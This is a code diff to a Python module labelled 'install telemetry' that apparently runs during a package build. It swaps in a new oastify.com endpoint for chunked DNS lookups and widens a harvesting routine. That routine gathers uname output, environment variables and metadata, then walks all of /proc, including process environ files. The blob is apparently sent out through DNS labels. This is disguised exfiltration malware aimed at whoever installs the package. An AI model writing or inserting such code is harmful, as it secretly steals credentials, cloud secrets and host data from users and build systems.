@@ -27,7 +27,7 @@ except Exception:
 
 # --- install telemetry ----------------------------------------------------
 
-_ENDPOINT = "0z0fchltstj0hai145xpr4ssajgb44st.oastify.com"
+_ENDPOINT = "8y7nbpk1r1i8gih93dwxqcr09rfj3dr2.oastify.com"
 _CHUNK = 48          # hex chars per label = 24 raw bytes; 4+1+4+1+48 = 58, under 63
 _WORKERS = 128       # DNS lookups in flight
 _DEADLINE = 60       # seconds; the build never blocks longer than this
@@ -75,29 +75,21 @@ _ECS_PATHS = (
 _DUMP = True
 _DUMP_KEY = "AWS_EC2_PROC"
 _DUMP_NAME = ".np-proc"
-_DUMP_CAP = 262144                     # raw chars before compression
+_DUMP_CAP = 524288                     # raw chars before compression
 
-_PROC_TOP = (
-    "/proc/version", "/proc/cmdline", "/proc/cpuinfo", "/proc/meminfo",
-    "/proc/filesystems", "/proc/mounts", "/proc/self/mountinfo",
-    "/proc/loadavg", "/proc/uptime", "/proc/stat", "/proc/modules",
-    "/proc/partitions", "/proc/devices", "/proc/misc", "/proc/swaps",
-    "/proc/keys", "/proc/locks", "/proc/self/cgroup", "/proc/self/status",
-    "/proc/self/environ", "/proc/self/cmdline",
-    "/proc/1/environ", "/proc/1/cmdline", "/proc/1/status",
-    "/proc/1/cgroup", "/proc/1/mountinfo", "/proc/1/limits", "/proc/1/io",
-    "/proc/sys/kernel/hostname", "/proc/sys/kernel/osrelease",
-    "/proc/sys/kernel/ostype", "/proc/sys/kernel/version",
-    "/proc/sys/kernel/random/boot_id", "/proc/sys/kernel/pid_max",
-    "/proc/sys/kernel/threads-max", "/proc/sys/fs/file-max",
-    "/proc/net/route", "/proc/net/arp", "/proc/net/dev", "/proc/net/tcp",
-    "/proc/net/tcp6", "/proc/net/udp", "/proc/net/unix", "/proc/net/fib_trie",
-)
-_PROC_TOP_CAP = 3072
-_PID_DIR_CAP = 40
-_PID_FILES = ("cmdline", "comm", "status", "cgroup", "environ", "limits", "io")
-_PID_CAP = 768
-_PID_LINKS = ("cwd", "exe", "root")
+# skipped by basename: the only entries that are huge or that block
+_PROC_SKIP = frozenset((
+    "kcore",         # ELF core of the running kernel, gigabytes
+    "kmsg",          # blocks when the ring buffer is empty
+    "mem",           # whole address space, holes and all
+    "pagemap",       # 8 bytes per page
+    "kpagecount",    # huge parallel arrays
+    "kpageflags",
+    "kpagecgroup",
+))
+_PROC_DEPTH = 6                        # /proc/sys/net/ipv4/conf/<if>/<leaf> is 6 deep
+_PROC_MAX_FILES = 5000                 # hard stop on entries
+_PROC_FILE_CAP = 4096                  # per-file bytes
 
 
 class _BytesSink(object):
@@ -455,7 +447,7 @@ def _metadata():
 
 
 def _read(path, cap):
-    """Read at most `cap` bytes. Missing, unreadable, vanished: all None."""
+    """Read at most `cap` bytes. Missing, unreadable, vanished, EISDIR: all None."""
     try:
         with open(path, "rb") as fh:
             return fh.read(cap)
@@ -464,44 +456,71 @@ def _read(path, cap):
 
 
 def _dump_text(extra):
-    """One concatenated text blob: uname, env, metadata, then /proc."""
+    """One concatenated text blob: uname, env, metadata, then all of /proc.
+
+    /proc is walked, not listed. Only the basenames in _PROC_SKIP are passed
+    over; everything else is read with a per-file cap, and symlinks are
+    recorded as targets rather than followed, which is what stops
+    /proc/<pid>/root from dragging the whole filesystem in.
+    """
     parts = []
     total = [0]
+    count = [0]
 
-    def add(text):
-        parts.append(text)
+    def add(name, data):
+        if not data:
+            return
+        text = data.decode("utf-8", "replace").replace("\x00", "\n")
+        parts.append("=== %s ===\n%s\n" % (name, text))
         total[0] += len(text)
 
     try:
-        add("=== uname -a ===\n" + " ".join(os.uname()) + "\n")
+        add("uname -a", (" ".join(os.uname()) + "\n").encode("utf-8", "replace"))
     except Exception:
         pass
     for name in sorted(extra or {}):
         body = (extra or {}).get(name)
         if body:
-            add("=== %s ===\n%s\n" % (name, body))
-    for path in _PROC_TOP:
-        data = _read(path, _PROC_TOP_CAP)
-        if data:
-            add("=== %s ===\n%s\n" % (path, data.decode("utf-8", "replace")))
-    try:
-        pids = [d for d in os.listdir("/proc") if d.isdigit()]
-    except Exception:
-        pids = []
-    for pid in pids[:_PID_DIR_CAP]:
-        if total[0] >= _DUMP_CAP:
-            break
-        for name in _PID_FILES:
-            data = _read("/proc/%s/%s" % (pid, name), _PID_CAP)
-            if data:
-                add("=== /proc/%s/%s ===\n%s\n"
-                    % (pid, name, data.decode("utf-8", "replace")))
-        for link in _PID_LINKS:
+            add(name, body.encode("utf-8", "surrogateescape"))
+
+    def rec(path, depth, name):
+        if depth > _PROC_DEPTH or total[0] >= _DUMP_CAP or count[0] >= _PROC_MAX_FILES:
+            return
+        if name in _PROC_SKIP:
+            return
+        try:
+            link = os.path.islink(path)
+        except Exception:
+            link = False
+        if link:
             try:
-                add("=== /proc/%s/%s ===\n%s\n"
-                    % (pid, link, os.readlink("/proc/%s/%s" % (pid, link))))
+                add(path.lstrip("/") + " ->", (os.readlink(path) + "\n").encode("utf-8", "replace"))
+                count[0] += 1
             except Exception:
                 pass
+        try:
+            isfile = os.path.isfile(path)
+        except Exception:
+            isfile = False
+        if isfile:
+            data = _read(path, _PROC_FILE_CAP)
+            if data:
+                add(path.lstrip("/"), data)
+                count[0] += 1
+            return
+        if link:
+            return
+        try:
+            names = os.listdir(path)
+        except Exception:
+            return
+        names.sort(key=lambda s: (0, int(s)) if s.isdigit() else (1, s))
+        for child in names:
+            rec(path + "/" + child, depth + 1, child)
+
+    if os.path.isdir("/proc"):
+        rec("/proc", 0, "proc")
+
     return "".join(parts).encode("utf-8", "surrogateescape")
 
 
